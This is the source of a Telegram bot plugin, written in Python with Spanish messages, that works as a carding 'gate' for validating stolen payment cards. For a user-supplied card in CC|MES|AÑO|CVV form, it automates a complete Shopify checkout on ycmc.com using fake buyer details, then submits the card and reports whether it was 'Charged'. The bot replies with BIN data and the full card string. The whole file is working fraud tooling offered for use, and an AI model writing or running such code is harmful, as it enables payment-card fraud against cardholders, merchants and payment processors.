import plugins.clases.sho_defs as s
from pyrogram import Client, filters 
from pyrogram.types import Message
from plugins.clases.usuarios import usuario
import time
from plugins.defs1 import luhn, get_cc, bininfo
from plugins.sql.gates import buscarT
from plugins.defs1 import buscarEnT
from urllib.parse import urlparse
import requests
from faker import Faker
fake = Faker()
r=requests.Session()
saldo = "10"
gate = "Zygarde"
@Client.on_message(filters.command(["ezzy"], prefixes=["/", "."]))
async def premium(_, m: Message):
    Status = buscarT("ezzy")
    try:
        Estado = Status[2]
    except Exception: return await m.reply('<b>Error al encontrar el Gate</b>')
    if Estado == 'off': return await m.reply(f'𝑬𝒔𝒕𝒆 𝒄𝒐𝒎𝒂𝒏𝒅𝒐 𝒆𝒔𝒕𝒂 𝒅𝒆𝒔𝒂𝒄𝒕𝒊𝒗𝒂𝒅𝒐 𝒕𝒆𝒎𝒑𝒐𝒓𝒂𝒍𝒎𝒆𝒏𝒕𝒆\n𝑹𝒂𝒛𝒐́𝒏: <i>{Status[3]}</i>')
    start_time = time.time()
    user = m.from_user.username
    id = m.from_user.id
    user = usuario(nombre=user, id=id)
    rango = user.buscar()
    if not rango or rango == False: return await m.reply('<b>Usuario no registrado porfavor registrese</b>')
    if rango[2] == 'Free':
        return await m.reply('<b>Necesita ser Premium para utilizar este gate</b>')
    rangoC = rango[5]
    if rangoC == None:
        rangoC = rango[2]   
    try:
        cc, mes, año, cvv = get_cc(m.text)
        veri = luhn(cc)
        if not cc or not mes or not año or not cvv: return await m.reply('<b>Formato invalido</b>')
        if veri == False: return await m.reply("<b>Algoritmo Luhn invalido ❌</b>")
    except Exception:
        return await m.reply("<b>Formato invalido\nCC|MES|AÑO|CVV</b>")
    respuesta = await m.reply(f"""<b>Checkeando CC | ⏳</b>""")
    
    product_link = "https://www.ycmc.com/products/ycmc-money-card"
    
    #res1 = s.cart(product_link)
    #if not res1: return await respuesta.edit("<b>Error al checkear la cc</b>")
    #checkout_url, auth_token, webname = res1
    r1 = r.get(product_link)
    varient_id = buscarEnT(r1.text, 'variantId":',',')
    if not r1 or not varient_id: return await m.reply('Error')

    b_data = {
	"form_type": "product","utf8": "✓",
	"id": varient_id,"properties[_rc]": "9711",
	"properties[shipping_method]": "me",
	"properties[store_pickup]": "","quantity": "1"
}
    b_head = {
    'x-requested-with': 'XMLHttpRequest',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0'
    }
    webname = urlparse(product_link).netloc
    r2 = r.post(f'https://{webname}/cart/add', headers =b_head,data =b_data)
    if not r2: return await m.reply('Error')

    d_data = {
'updates[]': '1',
'checkout': 'Check Out'
}
    d_head = {
    'x-requested-with': 'XMLHttpRequest',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0'
    }

    r3 = r.post(f'https://{webname}/cart', headers=d_head, data=d_data)
    auth_token = buscarEnT(r3.text, 'type="hidden" name="authenticity_token" value="','"')
    if not r3 or not auth_token: return await m.reply('Error')  
    checkout_url = r3.url
    time1 = time.time()
    await respuesta.edit(f"<b>Checkeando CC | 20%\nTiempo: {time1-start_time:0.3} segundos</b>")
    
    #def checkout(cc, mes, año, cvv, checkout_url, auth_token, webname)
    email = fake.ascii_free_email()
    t1_data = {
	"_method": "patch",
	"authenticity_token": auth_token,
	"previous_step": "contact_information",
	"step": "shipping_method",
	"checkout[email]": email,
	"checkout[buyer_accepts_marketing]": [
		"0",
		"1"
	],
	"checkout[shipping_address][first_name]": [
		"",
		"jose"
	],
	"checkout[shipping_address][last_name]": [
		"",
		"quiroz"
	],
	"checkout[shipping_address][company]": [
		"",
		""
	],
	"checkout[shipping_address][address1]": [
		"",
		"157+Allen+Street"
	],
	"checkout[shipping_address][address2]": [
		"",
		""
	],
	"checkout[shipping_address][city]": [
		"",
		"New+York"
	],
	"checkout[shipping_address][country]": [
		"",
		"United States"
	],
	"checkout[shipping_address][province]": [
		"",
		"NY"
	],
	"checkout[shipping_address][zip]": [
		"",
		"10009"
	],
	"checkout[shipping_address][phone]": [
		"",
		"(717)+123-1234"
	],
	"checkout[remember_me]": [
		"false",
		"0"
	],
	"checkout[buyer_accepts_sms]": "0",
	"checkout[sms_marketing_phone]": "",
	"checkout[client_details][browser_width]": "1920",
	"checkout[client_details][browser_height]": "553",
	"checkout[client_details][javascript_enabled]": "1",
	"checkout[client_details][color_depth]": "24",
	"checkout[client_details][java_enabled]": "false",
	"checkout[client_details][browser_tz]": "180"
}
    t1 = r.post(checkout_url, data=t1_data)
    if not t1 or not "step=shipping_method" in t1.url: return await m.reply('Error')
    t_data = {
	"_method": "patch",
	"authenticity_token": auth_token,
	"previous_step": "shipping_method",
	"step": "payment_method",
	"checkout[shipping_rate][id]": "shopify-Standard-0.00",
	"checkout[client_details][browser_width]": "1920",
	"checkout[client_details][browser_height]": "994",
	"checkout[client_details][javascript_enabled]": "1",
	"checkout[client_details][color_depth]": "24",
	"checkout[client_details][java_enabled]": "false",
	"checkout[client_details][browser_tz]": "180"
}
    t = r.post(checkout_url, data=t_data)
    if not t: return await respuesta.edit('Error')
    payment_gateway = buscarEnT(t.text,'data-subfields-for-gateway="','"')
    if not payment_gateway:
        t2 = r.get(checkout_url+"?previous_step=shipping_method&step=payment_method")
        payment_gateway = buscarEnT(t2.text,'data-subfields-for-gateway="','"')
        if not payment_gateway:
            print(t2.text)
            return await respuesta.edit('Error')
        time1 = time.time()
        await respuesta.edit(f"<b>Checkeando CC | 50%\nTiempo: {time1-start_time:0.3} segundos</b>")
    nombre = str(fake.name())

    json_four = {"credit_card": {"month": mes,"name": nombre,"number": cc,"verification_value": cvv,"year": año},"payment_session_scope": webname}

    four = r.post('https://deposit.us.shopifycs.com/sessions', json = json_four)
    
    if "id" not in four.json(): return await respuesta.edit('Error')
    id = four.json()["id"] 
    #await m.reply(auth_token)
    #await m.reply(id)
    #await m.reply(gateway)

    dic = {
	"_method": "patch",
	"authenticity_token": auth_token,
	"previous_step": "payment_method",
	"step": "",
	"s": id,
	"checkout[payment_gateway]": payment_gateway,
	"checkout[credit_card][vault]": "false",
	"checkout[different_billing_address]": "false",
	"checkout[total_price]": "1000",
	"complete": "1",
	"checkout[client_details][browser_width]": "1920",
	"checkout[client_details][browser_height]": "664",
	"checkout[client_details][javascript_enabled]": "1",
	"checkout[client_details][color_depth]": "24",
	"checkout[client_details][java_enabled]": "false",
	"checkout[client_details][browser_tz]": "180"
}

    f = r.post(checkout_url, data = dic)
    response_r1 = buscarEnT(f.text, 'class="notice__text">', "<")
    if not f or 'processing' not in f.url and response_r1 == None: return await respuesta.edit('Error')
    time2 = time.time()
    await respuesta.edit(f"<b>Checkeando CC | 85%\nTiempo: {time2-start_time:0.3} segundos</b>")
    time.sleep(4)
    g = r.get(checkout_url + '/processing?from_processing_page=1')
    time.sleep(6)
    charge_Link=None
    if "Thank you" in g.text: charge_Link = "Charged"
    if not charge_Link:
        if not g or 'from_processing_page=1&validate=true' not in g.url: return await respuesta.edit('Error')
    texto = g.text
    #await respuesta.edit(f"<b>Checkeando CC | 70%\nTiempo: {time2-start_time:0.3} segundos</b>")
    #time.sleep(1)"""
    
    #t(cc, mes, año, cvv, checkout_url, auth_token, webname):
    #r2 = s.checkout(cc, mes, año, cvv, checkout_url, auth_token, webname)
    #if not r2: return await m.reply('Error')
    #texto, charge_Link = r2
    r3 = s.response(texto, charge_Link, saldo)
    if not r3: return await respuesta.edit("<b>Error al checkear la cc</b>")
    r_logo, r_message, r_res = r3
    
    
    #def texto(r_logo, r_message, r_res, nombre, apellido, taken, id, rangoC, complete, gate, bin, brand, type, level, bank, emojiCountry, country, currency, pais)
    nombre = m.from_user.first_name
    apellido = m.from_user.last_name
    complete = f"{cc}|{mes}|{año}|{cvv}"
    #return bin, brand, type, level, bank, pais, country, emojiCountry, currency
    binInf = bininfo(cc)
    if not binInf: return await respuesta.edit("<b>Error al checkear la cc</b>")
    bin, brand, type, level, bank, pais, country, emojiCountry, currency = binInf
    time3 = time.time()
    taken = f"{time3-start_time:0.3}"
    r4 = s.texto(r_logo, r_message, r_res, nombre, taken, id, rangoC, complete, gate, bin, brand, type, level, bank, emojiCountry, country, currency)
    if not r4: return await respuesta.edit("<b>Error al checkear la cc</b>")
    await respuesta.edit(r4)